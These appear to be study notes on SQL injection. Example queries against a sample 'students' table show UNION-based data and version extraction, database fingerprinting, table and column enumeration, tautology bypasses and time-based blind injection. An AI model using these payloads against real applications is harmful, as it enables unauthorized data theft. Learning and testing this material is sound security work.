SQL Injection commands,

Assume we have a table students with 5 columns

select * from students where Student_ID = 1 UNION SELECT 1,1,1,1,@@version;  --> Will show the DB verison (number of columns must match in union statement)

UNION SELECT banner FROM v$version WHERE rownum=1 (For Oracle)

select * from students where Student_ID = 5
select * from students where Student_ID = 6-POW(1,1)  --> By use of a mysql POW function, if both the above queries result in same result then it's a MySQL DB 

select * from students where Student_ID = 1 UNION select 1,1,1,1,UUID();  --> Will show the Universal Unique Identifier(UUID) namespace

select * from students where Student_ID = 1 UNION select 1,1,1,1,IF(5>2, 'passed', 'failed'); --> This will return the true condition block 'passed' as part of the retrieved SQL result

select * from students where Student_ID = 1 or 1=1;  --> Will give all columns data from the selected table

select * from students where Student_ID = 1 UNION select count(*) from <Table_Name>;  --> Will return the number of rows/records in the table

select * from students where Student_ID = 1 UNION SELECT 1 FROM <TABLE_NAME>;  --> To enumerate if the specified table is present or not 
                                                                                    returns table not exists or SELECT statement have a different number of columns

select * from students where Student_ID = 1 order by 6;  --> To enumerate number of columns in the existing table
                                                              Will give an SQL error as we have only 5 columns in the students table and we are trying to order 
                                                              the result by column 6 which does not exist in the table

select * from students where Student_ID = 1 UNION SELECT 'a', 1, 'b', 5, 'as' FROM <TABLE_NAME>;  --> To enumerate data types of each column in the selected DATABASE

select * from students where Student_ID = 1 UNION SELECT * FROM students; --> Will give all columns data from the selected table

SELECT name, description, price FROM products WHERE category=1 AND 1=2 UNION SELECT * FROM members  --> this will return first union statement as well as
                                                                                                        second statement records if and only if column numbers match

Time Based SQL Injection,

select * from students where Student_ID = 1 and SLEEP(50); --> This query will return the results after waiting for the specified time in secs in SLEEP() function

select * from students where Student_ID = 1-BENCHMARK(100, rand());  --> Will run the specified function 100 times and then give out the result
